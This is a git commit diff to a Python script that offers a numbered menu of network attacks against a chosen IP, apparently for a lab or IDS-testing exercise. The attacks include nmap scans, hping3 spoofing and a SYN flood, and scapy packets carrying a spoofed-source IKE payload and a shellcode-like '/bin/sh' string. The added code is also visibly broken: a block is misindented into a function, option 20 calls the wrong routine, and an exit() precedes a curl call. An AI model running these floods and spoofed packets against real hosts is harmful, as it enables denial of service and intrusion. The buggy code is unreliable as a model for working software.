4c5ea0a1d4cab5ea049e470e5cb331f051b9896f
Fast3212 <fast3212@gmail.com>
2020-02-09 17:46:39 -0500

    Adding Scripts Withing The Python File

--- Practical.py
+++ Practical.py
@@ -2,22 +2,47 @@
 import os
 import logging
 import subprocess
+import time
+import binascii
 
 from scapy.all import *
 
-def icmp_scapy():
-    
-    ip_layer = IP(dst='10.0.0.2')
-    icmp_layer = ICMP()
-    packet = ip_layer / icmp_layer
-    send(packet)
-    print("Packet Sent")
 
 while True:
+
     attack = int(input('Choose Attack:  '))
     ip = str(input("What is the IP of the Target:  "))
- 
-    if attack == 1:
+    obf = str(input("What is the your obfuscated IP (if applicable):  "))
+
+    def icmp_scapy():
+        ip_layer = IP(dst= ip)
+        icmp_layer = ICMP()
+        packet = ip_layer / icmp_layer
+        send(packet)
+        print("Packet Sent")
+
+    def windows_messenger():
+        ip_layer = IP(src=ip, dst=obf)
+        udp_data = "B"*150
+        udp_layer = UDP(dport=1026, sport=22344, len=150)
+        send(ip_layer / udp_layer / Raw(udp_data))
+        print("Packet Sent")
+    def pgpnet_connection():
+        ip_layer = IP(src=obf, dst=ip)
+        udp_data = binascii.unhexlify('00000000000000000000000000000110020000000000000000880D00005C00000001000000010000005001010002030000240101000080010006800200028003000380040005800B0001000C000400015180000000240201000080010005800200018003000380040002800B0001000C00040001518000000010')
+        length = len(udp_data)
+        udp_layer = UDP(dport=500, sport=22344, len=length)
+        send(ip_layer / udp_layer / Raw(udp_data))
+        print("packet sent")
+    def shell_code():
+        ip_layer = IP(src='10.0.0.1', dst='10.0.0.2')
+        udp_data = binascii.unhexlify('909090E8C0FFFFFF2f62696e2f7368') # Shellcode and /bin/sh string
+        length = len(udp_data)
+        udp_layer = UDP(dport=4444, sport=22344, len=length)
+        send(ip_layer / udp_layer / Raw(udp_data))
+        print("Packet Sent")
+
+        if attack == 1:
         print("SYN Scan")
         subprocess.call(f"nmap -p 22 -sS {ip}", shell=True)
         subprocess.call(["ls", "-l"])
@@ -47,7 +72,7 @@ while True:
         subprocess.call(f"nmap -p 80 -O {ip}", shell=True)
     elif attack == 10:
         print("IP Spoofing")
-        subprocess.call(f"hping3 -S {ip} -a 192.168.20.5 -c 3 ", shell=True)
+        subprocess.call(f"hping3 -S {ip} -a {obf}-c 3 ", shell=True)
     elif attack == 12:
         print("DDOS: Syn Floods")
         subprocess.call(f"hping3 -c 10000 -d 120 -S -w 64 -p 80 --flood {ip} ", shell=True)
@@ -57,6 +82,33 @@ while True:
     elif attack == 14:
         print("ICMP Scapy")
         icmp_scapy()
+    elif attack == 15:
+        print("Nmap command attempt")
+        subprocess.call(f"echo 'nmap%20' | nc {ip} 8080 " , shell=True)
+        exit()
+        subprocess.call(f'curl {ip}:8080/index.php?test=nmap%20')
+    elif attack == 16:
+        print("Source Routing")
+        subprocess.call(f"hping3 -S -p 10 -c 5 --lsrr {obf} {ip}", shell=True)
+    elif attack == 17:
+        print("Windows Messenger Pop-Up Spam")
+        subprocess.call(f"hping3 -S -p 10 -c 5 --lsrr {obf} {ip}", shell=True)
+    elif attack == 18:
+        print("ICMP Scapy")
+        windows_messenger()
+    elif attack == 19:
+        print("PGPNet Connection")
+        pgpnet_connection()
+    elif attack == 20:
+        print("Linux Shell Code")
+        pgpnet_connection()      
+    
+   
+
+
+        
+
+
     else:
         print("Blyat!@#")
         
